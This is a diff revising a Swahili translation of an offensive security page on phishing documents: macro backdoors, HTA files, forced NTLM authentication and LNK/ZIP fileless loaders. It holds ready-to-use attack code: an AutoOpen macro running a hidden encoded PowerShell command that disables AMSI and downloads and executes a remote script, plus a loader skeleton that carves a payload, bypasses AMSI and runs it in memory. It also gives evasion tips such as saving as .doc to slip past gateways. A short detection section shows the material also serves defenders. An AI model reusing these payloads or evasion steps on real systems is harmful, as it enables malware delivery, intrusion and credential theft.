@@ -1,40 +1,40 @@
-# Phishing Faili & Nyaraka
+# Faili na Nyaraka za Phishing
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Nyaraka za Office
 
-Microsoft Word hufanya uthibitishaji wa data za faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Kama hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.
+Microsoft Word hufanya uhakiki wa data za faili kabla ya kufungua faili. Uhakiiki wa data unafanywa kwa njia ya utambuzi wa muundo wa data, kulingana na viwango vya OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.
 
-Kawaida, Word files containing macros use the `.docm` extension. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha nyongeza ya faili na bado kuhifadhi uwezo wao wa kutekeleza macro.\
-Kwa mfano, faili ya RTF kwa kawaida haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macro.\
-Miundo na mekanisimu za ndani zile zile zinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint etc.).
+Kwa kawaida, faili za Word zenye macros zinatumia extension ya `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha extension ya faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\
+Kwa mfano, faili ya RTF haiungi mkono macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
+Mekanismi na vipengele vya ndani sawa vinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint etc.).
 
-Unaweza kutumia amri ifuatayo kuchunguza ni nyongeza zipi zitakazotekelezwa na programu fulani za Office:
+Unaweza kutumia amri ifuatayo kuangalia ni extension zipi ambazo zitatekelezwa na baadhi ya programu za Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-Faili za DOCX zinazorejelea kiolezo cha mbali (File –Options –Add-ins –Manage: Templates –Go) kinachojumuisha macros zinaweza pia “kutekeleza” macros.
+Faili za DOCX zinazorejelea kiolezo cha mbali (File –Options –Add-ins –Manage: Templates –Go) ambazo zina macros zinaweza pia “execute” macros.
 
-### Kupakia Picha ya Nje
+### Kupakia Picha za Nje
 
 Nenda kwa: _Insert --> Quick Parts --> Field_\
-_**Jamii**: Links and References, **Majina ya field**: includePicture, na **Jina la Faili au URL**:_ http://<ip>/whatever
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
-Inawezekana kutumia macros kuendesha msimbo wa aina yoyote kutoka kwa hati.
+Inawezekana kutumia macros kuendesha arbitrary code kutoka kwenye dokumenti.
 
 #### Autoload functions
 
-Kadiri zinavyozidi kuwa za kawaida, ndivyo AV inavyoweza kuzitambua.
+Kadiri zinavyokuwa za kawaida zaidi, ndivyo uwezekano wa AV kuzitambua.
 
 - AutoOpen()
 - Document_Open()
 
-#### Mifano ya msimbo ya Macros
+#### Mifano ya Macros Code
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -64,16 +64,16 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Ondoa metadata kwa mikono
+#### Ondoa metadata kwa mkono
 
-Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.
+Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.
 
-#### Upanuzi wa Doc
+#### Ugani la Doc
 
-Wakati umemaliza, chagua dropdown ya **Save as type**, badilisha fomati kutoka **`.docx`** kuwa **Word 97-2003 `.doc`**.\
-Fanya hivi kwa sababu huwezi kuhifadhi macros ndani ya **`.docx`** na kuna stigma kuhusiana na extension ya macro-enabled **`.docm`** (mf., ikoni ya thumbnail ina `!` kubwa na baadhi ya web/email gateway huziweka block kabisa). Kwa hivyo, extension ya legacy **`.doc`** ni suluhisho bora.
+When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
+Fanya hivi kwa sababu wewe **can't save macro's inside a `.docx`** na kuna aibu inayohusiana na ugani unaounga mkono macro **`.docm`** (mfano ikoni ya thumbnail ina `!` kubwa na baadhi ya web/email gateway huzuia kabisa). Kwa hiyo, ugani wa zamani **`.doc`** ndio suluhisho bora.
 
-#### Vizalishaji vya Macros Hatari
+#### Malicious Macros Generators
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ Fanya hivi kwa sababu huwezi kuhifadhi macros ndani ya **`.docx`** na kuna stigm
 
 ## Faili za HTA
 
-HTA ni programu ya Windows inayochanganya **HTML na scripting languages (such as VBScript and JScript)**. Inatengeneza interface ya mtumiaji na inaendeshwa kama programu "fully trusted", bila vizingiti vya modeli ya usalama ya browser.
+HTA ni programu ya Windows ambayo **inachanganya HTML na lugha za scripting (such as VBScript and JScript)**. Inaunda kiolesura cha mtumiaji na inatekelezwa kama programu "fully trusted", bila vikwazo vya modeli ya usalama ya browser.
 
-HTA inaendeshwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imewekwa** pamoja na **Internet Explorer**, na hivyo **`mshta` inategemea IE**. Hivyo ikiwa imeondolewa, HTA haziwezi kuendeshwa.
+HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **huwekwa** pamoja na **Internet Explorer**, na hivyo kufanya **`mshta` dependant on IE**. Hivyo, kama imeondolewa, HTA hazitaweza kutekelezwa.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -140,9 +140,9 @@ self.close
 ```
 ## Kulazimisha NTLM Authentication
 
-Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atafikia (hata HTTP MitM?). Au tuma mwathiriwa **anwani ya mafaili** ambayo itatazua **authentication** tu kwa **kufungua folda.**
+Kuna njia kadhaa za **kulazimisha NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji ataziingia (hata HTTP MitM?). Au mtume mwathiriwa **anuani ya faili** ambayo itawasha **authentication** kwa kufungua folda tu.
 
-**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**
+**Angalia mawazo haya na zaidi katika kurasa zifuatazo:**
 
 
 {{#ref}}
@@ -156,24 +156,24 @@ Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**, kwa mfano, 
 
 ### NTLM Relay
 
-Usisahau kuwa hutaweza tu kuiba hash au authentication lakini pia **kutekeleza NTLM relay attacks**:
+Usisahau kwamba huwezi kuiba tu hash au authentication, bali pia **perform NTLM relay attacks**:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Kampeni zenye ufanisi mkubwa huzalisha ZIP inayojumuisha nyaraka mbili halali za kuibua (PDF/DOCX) na .lnk hatarishi. Njia ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya raw bytes za ZIP baada ya alama ya kipekee, na .lnk inachonga na kuendesha yote ndani ya kumbukumbu.
+Kampeni zenye ufanisi mkubwa hutuma ZIP inayojumuisha hati mbili halali za kuwadanganya (PDF/DOCX) na .lnk yenye madhara. Njia ni kwamba PowerShell loader mwenyewe imehifadhiwa ndani ya raw bytes za ZIP baada ya marker maalum, na .lnk huichonga na kuiendesha yote ndani ya memory.
 
 Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:
 
-1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na mzazi wa current working directory.  
-2) Soma bytes za ZIP na tafuta marker iliyowekwa kimagurudumu (mfano, xFIQCV). Kila kitu baada ya marker ni PowerShell payload iliyowekwa.  
-3) Nakili ZIP hadi %ProgramData%, ifungue hapo, na fungua decoy .docx ili ionekane halali.  
-4) Kuepuka AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
-5) Deobfuscate hatua inayofuata (mfano, ondoa herufi zote #) na itekeleze ndani ya kumbukumbu.
+1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent ya current working directory.
+2) Soma bytes za ZIP na upate marker iliyowekwa (mfano, xFIQCV). Kila kitu kilicho baada ya marker ni PowerShell payload iliyowekwa.
+3) Nakili ZIP hadi %ProgramData%, extract hapo, na fungua decoy .docx ionekane halali.
+4) Kwepa AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Deobfuscate stage inayofuata (mfano, ondoa wote # characters) na uitekelleze ndani ya memory.
 
-Mfano wa skeleton ya PowerShell ili kuchonga na kuendesha hatua iliyowekwa:
+Example PowerShell skeleton to carve and run the embedded stage:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -190,12 +190,12 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 Invoke-Expression $code
 ```
-Vidokezo
-- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
-- Sehemu inayofuata mara nyingi hu-decrypt base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza artifacts za diski.
+Notes
+- Usambazaji mara nyingi hutumia vibaya subdomains za PaaS zenye sifa nzuri (mfano, *.herokuapp.com) na inaweza kuweka vizuizi kwa payloads (kutoa ZIP zisizo hatari kulingana na IP/UA).
+- Hatua inayofuata mara nyingi hu-decrypt base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza alama kwenye diski.
 
-Persistence iliyotumika katika mnyororo huo huo
-- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au app yoyote inayoi-embed irejeshe payload moja kwa moja. See details and ready-to-use commands here:
+Persistence used in the same chain
+- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
@@ -207,7 +207,16 @@ Hunting/IOCs
 - AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
 - Long-running business threads ending with links hosted under trusted PaaS domains.
 
-## References
+## Windows files to steal NTLM hashes
+
+Angalia ukurasa kuhusu **places to steal NTLM creds**:
+
+{{#ref}}
+../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
+
+## Marejeo
 
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
